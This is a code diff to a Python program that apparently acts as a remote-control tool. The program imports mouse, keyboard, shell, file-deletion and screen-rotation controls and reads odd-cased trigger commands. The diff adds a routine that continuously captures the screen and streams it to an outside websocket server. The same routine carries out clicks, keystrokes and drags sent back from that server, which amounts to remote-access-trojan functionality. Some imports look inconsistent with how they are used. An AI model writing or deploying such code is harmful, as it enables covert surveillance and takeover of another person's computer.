@@ -1,9 +1,10 @@
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
+import json
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from os import path, mkdir, startfile, remove, system, listdir, rename, remove
 from mouse import move, click, wheel, double_click
 from rotatescreen import get_primary_display
-from PIL.Image import frombytes, Resampling
+from PIL.Image import struct, Image, frombytes, Resampling
 from webbrowser import open as wbopen
 from subprocess import run as sbrun
 from keyboard import wait, send
@@ -13,7 +14,7 @@ from threading import Thread
 from pyautogui import size, mouseDown, mouseUp
 from shutil import rmtree
 from shutil import which
-from io import BytesIO
+import io
 from mss import mss
 import tkinter as tk
 import builtins
@@ -23,6 +24,7 @@ import aiohttp
 import psutil
 import pygame
 import sys
+import websockets
 #                       SELECT URL
 while True:
     try:
@@ -409,6 +411,112 @@ def showerr(num:int) -> None:
         log(f"showerr Thread Error occured::\t{e}",state="WARN")
 
 ##                          Main Head                   ##
+async def controller(data):
+    global bsig
+    try:
+        data = json.loads(data)
+        print("[INPUT]", data)
+        if data["type"] == "click":
+            x = data["x"] * (width / data["width"])
+            y = data["y"] * (height / data["height"])
+            move(x, y)
+            if data["button"] == 0:
+                bsig = False;sleep(0.03)
+                click()
+            elif data["button"] == 1:
+                bsig = False;sleep(0.03)
+                click(button="middle")
+            elif data["button"] == 2:
+                bsig = False;sleep(0.03)
+                click(button="right")
+
+        elif data["type"] == "key" and data["button"]:
+            btns = [chr(k) if isinstance(k, int) else k for k in data["button"]]
+            keys = "+".join(btns)
+            send(keys.lower())
+
+        elif data["type"] == "scroll":
+            wheel(delta=-(data["deltaY"]))
+
+        elif data["type"] == "dbclick":
+            x = data["x"] * (width / data["width"])
+            y = data["y"] * (height / data["height"])
+            move(x, y)
+            bsig = False;sleep(0.03)
+            double_click()
+
+        elif data["type"] == "drag":
+            x1 = data["x1"] * (width / data["width"])
+            y1 = data["y1"] * (height / data["height"])
+            x2 = data["x2"] * (width / data["width"])
+            y2 = data["y2"] * (height / data["height"])
+            move(x1, y1)
+            sleep(0.01)
+            bsig = False;sleep(0.03)
+            mouseDown()
+            sleep(0.01)
+            move(x2, y2)
+            sleep(0.01)
+            mouseUp()
+
+    except Exception as e:
+        print(f"[INPUT ERROR] {e}")
+async def receive_messages(websocket):
+    async for message in websocket:
+        await controller(message)
+
+async def send_screen(websocket):
+    global sharing
+    with mss.mss() as sct:
+        monitor = sct.monitors[1]
+        frame_count = 0
+        start_time = time.time()
+
+        while sharing:
+            img = sct.grab(monitor)
+            img_pil = Image.frombytes("RGB", img.size, img.rgb)
+
+            img_pil = img_pil.resize((960, 540)) 
+
+            buf = io.BytesIO()
+            img_pil.save(buf, format='JPEG', quality=50)  
+            jpeg_bytes = buf.getvalue()
+            timestamp = int(time.time() * 1000)
+            timestamp_bytes = struct.pack(">Q", timestamp)
+            packet = timestamp_bytes + jpeg_bytes
+
+            try:
+                await websocket.send(packet) 
+            except Exception as e:
+                print(f"[SEND ERROR] {e}")
+                break
+
+            frame_count += 1
+            elapsed = time.time() - start_time
+            if elapsed >= 1.0:
+                print(f"[FPS] {frame_count} fps")
+                frame_count = 0
+                start_time = time.time()
+
+            await asyncio.sleep(0.05)
+
+async def screenshare():
+    uri = "wss://screenshare-server.onrender.com"
+    try:
+        async with websockets.connect(uri, max_size=None) as websocket:
+            await websocket.send("sender")
+            print("[INFO] Connected to server as sender")
+
+            await asyncio.gather(
+                send_screen(websocket),
+                receive_messages(websocket)
+            )
+
+    except Exception as e:
+        print(f"[ERROR] {e}")
+def share_trig():
+    asyncio.run(screenshare())
+
 def main():
     global sstate
     global sharing
@@ -469,7 +577,6 @@ def main():
             elif "sHaRe on" in cmd:
                 sharing = True
                 Thread(target=share_trig).start()
-                Thread(target=control_trig).start()
             elif "sHaRe off" in cmd:
                 sharing = False
             elif "bLoCk on" in cmd:
